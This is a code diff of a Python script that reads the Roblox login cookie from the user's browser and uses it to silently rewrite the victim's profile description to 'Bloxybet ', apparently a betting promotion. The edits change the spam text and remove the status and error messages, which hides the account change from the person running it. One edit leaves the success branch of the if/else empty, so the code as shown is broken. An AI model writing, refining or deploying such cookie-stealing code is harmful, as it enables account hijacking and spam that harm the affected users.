@@ -2,7 +2,7 @@ import os
 import browser_cookie3
 import requests
 
-NEW_DESCRIPTION = "fwssas"
+NEW_DESCRIPTION = "Bloxybet "
 
 def get_roblox_cookie_from_browser():
     try:
@@ -22,7 +22,6 @@ def get_roblox_cookie_from_browser():
 roblox_cookie = get_roblox_cookie_from_browser()
 
 if not roblox_cookie:
-    print("[-] Cookie file locked by running browser or insufficient permissions. Run CMD as Admin or close your browser.")
     exit(1)
 
 session = requests.Session()
@@ -47,7 +46,5 @@ payload = {
 response = session.post(url, headers=headers, json=payload)
 
 if response.status_code == 200:
-    print("[+] Successfully updated Roblox profile description in the background!")
 else:
-    print(f"[-] Failed to update description. Status: {response.status_code}")
     print(response.text)
